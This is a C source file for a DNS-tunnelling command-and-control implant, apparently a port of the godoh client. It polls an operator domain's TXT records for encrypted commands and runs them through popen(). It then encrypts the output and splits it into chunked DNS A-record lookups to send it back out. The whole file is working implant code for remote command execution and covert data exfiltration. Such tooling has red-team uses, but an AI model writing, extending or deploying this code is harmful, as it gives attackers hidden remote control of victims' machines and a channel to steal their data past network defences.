#include "client.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "options.h"

#include "util/dns.h"
#include "util/utils.h"
#include "util/crypt.h"
#include "util/json.h"
#include "util/crc32.h"

#include "includes/base64/base64.h"

#include "util/debug.h"

const char *resp_idle = "v=B2B3FE1C";
const char *resp_error = "v=D31CFAA4";
const char *resp_cmd = "v=A9F466E8";

const char *resp_success = "1.1.1.1";
const char *resp_failure = "1.1.1.2";


struct Client *init_client() {

    struct Client *client = malloc(sizeof(*client));

    client->status = Idle;

    char *agent_id = rand_str(5);
    char *agent_id_hex = bin_str_to_hex_str(agent_id, 5);
    client->agent_id = agent_id;
    client->agent_id_hex = agent_id_hex;

    client->domain = DOMAIN;
    snprintf(client->checkin_domain,
             sizeof(client->checkin_domain),
             "%s.%s",
             client->agent_id_hex,
             client->domain);

#ifdef DEBUG
    Dprintf("client init: state          = %d\n", client->status);
    Dprintf("client init: domain         = %s\n", client->domain);
    Dprintf("client init: agent_id       = %s\n", client->agent_id);
    Dprintf("client init: agent_id_hex   = %s\n", client->agent_id_hex);
    Dprintf("client init: checkin_domain = %s\n", client->checkin_domain);
#endif

    return client;
}

/*
 * Converts a request hex string ( like from a TXT response )
 * to decompressed, decrypted an decoded string.
 */
char *request_hex_to_string(const char *in) {

    int gz_bytes_len = 0;
    char *gz_bytes = hex_str_to_bin_char(in, &gz_bytes_len);

    // decrypt
    char clear[gz_bytes_len];
    size_t clear_len = decrypt(gz_bytes, gz_bytes_len, clear);

    // decode json
    char *c = calloc(clear_len, sizeof(char *));
    json_parse_command(clear, c);

    return c;
}

/*
 * Converts a null terminated string ( typically from command output ) to
 * a json encoded, encrypted and compressed byte array
 */
char *str_to_response_bytes(client_t *client, char *res, int *res_length) {

    if (strlen(res) == 0) {
        res = "(empty)";
    }

    // base64 res bytes
    int b64len;
    char *b64encoded = base64(res, strlen(res), &b64len);

    // json encode response struct
    char *json_encoded = calloc(strlen(res) * 2, sizeof(char *));
    json_serialize_cmd_response(client->command, b64encoded, json_encoded);

    // encrypt json payload
    int encr_len = 0;
    char *encr = encrypt(json_encoded, strlen(json_encoded), &encr_len);

    char *result = malloc(encr_len);
    for (int i = 0; i < encr_len; i++) {
        result[i] = encr[i];
    }

    *res_length = encr_len;

    free(json_encoded);

    return result;
}

int send_response(client_t *client, char **data, int data_count) {

    int err_fail = 0;

    for (int i = 0; i < data_count; i++) {

        char label[222]; // max label len
        snprintf(label, 222, "%s.%s", data[i], client->domain);
        Dprintf("[d] sending %d: %s\n", i, label);

        char *resp = dns_raw_a_lookup(label);

        if (resp == NULL) {
            Dprintf("[d] ! response was empty\n");
            err_fail = 1;
            goto DONE;
        }

        if (strstr(resp, resp_failure) != NULL) {
            Dprintf("[d] server indicated that the request failed\n");
            err_fail = 1;
        }

        if (strstr(resp, resp_success) != NULL) {
            Dprintf("[d] server indicated the request was successful\n");
        }

        free(resp);
    }

    DONE:
    // let's not leak that arrays memory
    for (int i = 0; i < data_count; i++) {
        free(data[i]);
    }

    client->status = Idle;

    return err_fail;
}


int poll(client_t *client) {

    char *txt = dns_raw_txt_lookup(client->checkin_domain);

    if (txt == NULL) {
        client->status = Idle;
        return 1;
    }

    if (strstr(txt, resp_idle) != NULL) {
        free(txt);
        client->status = Idle;
        return 1;
    }

    if (strstr(txt, resp_error) != NULL) {
        free(txt);
        client->status = Error;
        return 1;
    }

    if (strstr(txt, resp_cmd) != NULL) {
        // double check and make sure we have ,p=
        if (strstr(txt, ",p=") == NULL) {
            // something is wrong, lets ignore that response
            free(txt);
            client->status = Idle;
            return 1;
        }

        Dprintf("[d] txt response line: %s\n", txt);

        // when we're in a cmd state, we are expecting the bytes
        // to process as the value for p.
        //  ie. p=ffffff
        char *command;
        char s[2] = "=";

        char *token = strtok(txt, s);
        while (token != NULL) {
            command = token;
            token = strtok(NULL, s);
        }

#ifdef DEBUG
        Dprintf(" - command hex %s\n", command);
        Dprintf(" - command hex str len: %lu\n", strlen(command));
#endif

        char *c = request_hex_to_string(command);
        client->command = c;
        client->status = Command;
    }

    free(txt);

    return 1;
}

/*
 * Take a string command, executes it using popen() and
 * returns the resultant character array pointer.
 */
char *shell_exec_output(const char *command) {

    FILE *fp;
    size_t size, used;
    char *data = NULL;
    int ch;

    fp = popen(command, "r");
    if (!fp) {
        Dprintf("[d] failed to run the command");
        return NULL;
    }

    for (size = used = 0;;) {
        if (used >= size) {
            size = size ? 2 * size : 100;
            data = realloc(data, size);

            if (data == NULL) {
                Dprintf("[d] realloc for command output failed");
                return NULL;
            }
        }
        ch = getc(fp);
        if (ch == EOF) break;

        data[used++] = ch;
    }
    data[used] = 0;

    pclose(fp);

    data = realloc(data, used + 1);
    return data;
}


char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len) {
    // spec: https://github.com/sensepost/godoh/blob/1.6/protocol/utils.go#L39

    //		ident.type.seq.crc32.proto.datalen.data.data.data
    //
    //	ident: 		the identifier for this specific stream
    //	type:		stream status indicator. ie: start, sending, stop
    //	seq:		a sequence number to track request count
    //	crc32:		checksum value
    //	proto:		the protocol this transaction is for. eg: file transfer/cmd
    // 	datalen:	how much data does this packet have
    //	data:		the labels containing data. max of 3 but can have only one too
    //
    //	Size: 4 + 2 + 16 + 8 + 2 + 2 + 60 + 60 + 60 for a maximum size of 214
    //  Sample:
    //		0000.00.0000000000000000.00000000.00.00.60.60.60
    const int max_label = 222;  // datalen + .'s
    const int data_label_max = 30;
    const int data_label_all_max = data_label_max * 3;
    const int data_label_all_max_str = data_label_all_max * 2;  // 1 byte is 2 chars hex

    // the total number of requests based on how the src data divvies up
    int total_requests = (payload_len / data_label_all_max);
    if ((payload_len % data_label_all_max) != 0)
        total_requests += 1;

    // cater for the two start stream / end stream requests too
    total_requests += 2;

    // alloc for requests
    char **requests = (char **) calloc(total_requests, sizeof(char *));
    for (int i = 0; i < total_requests; i++) {
        requests[i] = (char *) calloc(max_label + 1, sizeof(char *));
    }

    *requests_len = total_requests;

    /* protocol constants */
    int stream_start = 0xbe;
    int stream_data = 0xef;
    int stream_end = 0xca;
    // int file_protocol = 0x00;
    char command_protocol = 0x01;
    /* protocol constants */

    int seq = 0;
    char ident[2] = {rand(), rand()};

    // initial request to start a stream
    // ident.type.seq.crc32.proto.datalen.data.data.data
    char init[max_label + 1];
    snprintf(init, max_label,
             "%02hhx%02hhx.%02x.%d.%02x.%02hhx.%x.%02x.%02x.%02x",
             ident[0], ident[1],// ident
             stream_start,      // type
             seq,               // seq
             0x00,              // crc32
             command_protocol,  // proto
             0,                 // datalen
             0x00, 0x00, 0x00); // data
    strncpy(requests[seq], init, max_label);

    // placeholder to know how much data we have encoded so far
    int data_offset = 0;
    seq++;

    while (seq < total_requests - 1) {

        // create the actual data requests

        char request[max_label + 1];
        memset(request, 0, max_label + 1);
        char byte_parts[3][data_label_all_max + 1];
        memset(byte_parts, 0, 3 * data_label_all_max + 1);
        char byte_full[data_label_all_max];
        memset(byte_full, 0, data_label_all_max);
        int byte_full_length = 0;

        for (int pi = 0; pi < 3; pi++) {

            // check if we are done
            if ((payload_len - data_offset) <= 0) {
                break;
            }

            // determine how much data to read in this chunk
            int chunk_len;
            if ((payload_len - data_offset) < data_label_max)
                chunk_len = payload_len - data_offset;
            else
                chunk_len = data_label_max;

            char byte_chunk[30] = {0};
            for (int i = 0; i < chunk_len; i++) {
                byte_chunk[i] = payload[i + data_offset];

                byte_full[(30 * pi) + i] = payload[i + data_offset];
                byte_full_length++;
            }

            char *as_hex = bin_str_to_hex_str(byte_chunk, chunk_len);
            strncpy(byte_parts[pi], as_hex, strlen(as_hex));

            // advance the offset array so that we strcpy from that offset
            data_offset += 30;
        }

        uint32_t crc = 0;
        crc32((const unsigned char *) byte_full, byte_full_length, &crc);

        // count the byte_parts that are populated
        int data_parts = 0;
        for (int p = 0; p < 3; p++) {
            if (strlen(byte_parts[p]) > 0) {
                data_parts++;
            }
        }

        // populate a string with the 3 labels properly formatted
        char data_parts_str[data_label_all_max_str + 1 + (3)]; // +3 for .'s
        memset(data_parts_str, 0, data_label_all_max_str + 1 + 3);
        switch (data_parts) {
            case 1:
                snprintf(data_parts_str, data_label_all_max_str + 4, "%s.0.0", byte_parts[0]);
                break;
            case 2:
                snprintf(data_parts_str, data_label_all_max_str + 4, "%s.%s.0", byte_parts[0], byte_parts[1]);
                break;
            case 3:
                snprintf(data_parts_str, data_label_all_max_str + 4, "%s.%s.%s", byte_parts[0], byte_parts[1],
                         byte_parts[2]);
                break;
            default:
                Dprintf("[d] somehow we have more than 3 data labels o_0\n");
                break;
        }

        snprintf(request, max_label,
                 "%02hhx%02hhx.%02x.%d.%02x.%02hhx.%02x.%s",
                 ident[0], ident[1],    // ident
                 stream_data,           // type
                 seq,                   // seq
                 crc,                   // crc32
                 command_protocol,      // proto
                 data_parts,            // datalen
                 data_parts_str);       // data
        strncpy(requests[seq], request, max_label);

        seq++;
    };

    // fin request
    char final[max_label + 1];
    snprintf(final, max_label,
             "%02hhx%02hhx.%02x.%d.%02x.%02hhx.%x.%02x.%02x.%02x",
             ident[0], ident[1],// ident
             stream_end,        // type
             seq,               // seq
             0x00,              // crc32
             command_protocol,  // proto
             0,                 // datalen
             0x00, 0x00, 0x00); // data
    strncpy(requests[seq], final, max_label);

    return requests;
}
